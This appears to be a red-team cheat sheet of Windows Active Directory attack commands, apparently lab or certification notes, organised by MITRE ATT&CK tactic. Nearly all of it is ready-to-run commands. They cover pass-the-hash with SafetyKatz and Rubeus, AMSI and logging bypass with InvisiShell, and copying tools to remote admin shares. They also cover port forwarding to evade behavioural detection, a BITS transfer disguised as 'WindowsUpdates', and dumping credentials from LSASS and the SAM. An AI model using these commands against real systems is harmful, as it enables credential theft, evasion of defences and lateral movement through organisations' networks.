## Objective

___

```ad-info
title:Objective 

- This note is used to generate a series of commonly used commands to facilitate certain techniques
```

___

## Commands

~~~ad-note
title: Defense Evasion TA0005 (Impersonation T1656)
*Performing PTH (aes256) with Loader + SafetyKatz*
___
```powershell
Loader.exe -path http://KALI/SafetyKatz.exe 
```

```powershell
sekurlsa::pth /user:null /domain:null /aes256:null /run:cmd.exe
```

Running InvisiShell
___
```powershell
C:\Windows\Tasks\InvisiShell\RunWithRegistryNonAdmin.bat 
```

Impersonation with Rubeus in current session
___
```powershell
Rubeus.exe asktgt /user:null /domain:null /aes256:null /ptt
```
~~~

~~~ad-note
title: Lateral Movement TA0008 (Lateral Tool Transfer T1570)
*Transfer tools* (only when strictly necessary)
___
*If target is a DC do not transfer AD-MODULE since it is already present*

```powershell
echo F | xcopy admodule-master\* \\null\c$\Windows\Tasks /E
```

```powershell
copy powerview.ps1 \\null\c$\Windows\Tasks
```

```powershell
xcopy C:\AD\Tools\InviShell\* \\null\c$\Windows\Tasks /E
```

```powershell
copy powertools.ps1 \\null\c$\Windows\Tasks
```

```powershell
copy QuickViewAD.ps1 \\null\c$\Windows\Tasks
```

```powershell
copy Loader.exe \\null\c$\Windows\Tasks
```

```powershell
copy Rubeus.exe \\null\c$\Windows\Tasks
```
~~~

~~~ad-note
title:Discovery TA0007 + Defense Evasion TA0005 (Impair Defenses T1562) 

*(AD Module + QuickViewAD.ps1)*

Start cmd session on remote machine, run InviShell (amsi + logging bypass)
___
```powershell
winrs -r:null cmd
```

```powershell
cd c:\windows\tasks
```

```powershell
RunWithRegistryNonAdmin.bat
```

Imports
___
```powershell
ipmo .\Microsoft.ActiveDirectory.Management.dll
```

```powershell
ipmo .\ActiveDirectory\ActiveDirectory.psd1
```

```powershell
ipmo .\powertools.ps1
```

```powershell
ipmo .\QuickViewAD.ps1
```

```powershell
invoke-allenum
```
~~~

~~~ad-note
title:Defense Evasion (TA0005) + Lateral Movement TA0008 (Lateral Tool Transfer T1570)

**Behavioural Detection Bypass**

*Port Forward Rule* on remote host

```powershell
winrs -r:null "netsh interface portproxy add v4tov4 listenport=8080 listenaddress=0.0.0.0 connectport=80 connectaddress=null"
```

*Firewall Rule* on localhost

```powershell
# open port 80 using rule
netsh advfirewall firewall add rule name="Open TCP Port 80" dir=in action=allow protocol=TCP localport=80
```

**Toolkit Transfer**

*Loader Tool Transfer* to remote host

Method A

```powershell
# mount windows\tasks to local machine
net use x: \\null\c$\Windows\Tasks /user:null\null 'PASSWORD'
```

```powershell
echo f | xcopy .\Loader.exe x:\
```

Method B (copy without mounting)

```powershell
# or simply copy the binary without mounting
echo f | xcopy .\Loader.exe \\null\c$\users\public\desktop /Y
```

Method C (HTTP)

```powershell
winrs -r:null "bitsadmin /transfer WindowsUpdates /priority normal http://127.0.0.1:8080/Loader.exe C:\\Windows\\Tasks\\Loader.exe"
```
~~~

~~~ad-note
title:Credential Access TA0006 (OS Credential Dumping T1003)
> Host `SafetyKatz` binary using HFS/HTTP server

*Load SafetyKatz Binary* (run the loader pointing to localhost, leveraging port forwarding rule)

```powershell
winrs -r:null "c:\Windows\Tasks\Loader.exe -path http://127.0.0.1:8080/safetykatz.exe"
```

*Dump credentials* 

```powershell
sekurlsa::ekeys
```
```powershell
privilege::debug
```
```powershell
sekurlsa::logonpasswords
```
```powershell
token::elevate
```
```powershell
lsadump::sam
```
~~~

~~~ad-note
title:Cleanup

*Localhost Cleanup*

```powershell
netsh advfirewall firewall show rule status=enabled name="Open TCP Port 80"
```

```powershell
netsh advfirewall firewall delete rule name="Open TCP Port 80"
```

```powershell
net use x:\ /d
```

*Remote Host Cleanup*

```powershell
winrs -r:null "netsh interface portproxy show v4tov4"
```

```powershell
winrs -r:null "netsh interface portproxy delete v4tov4 listenport=8080 listenaddress=0.0.0.0"
```
~~~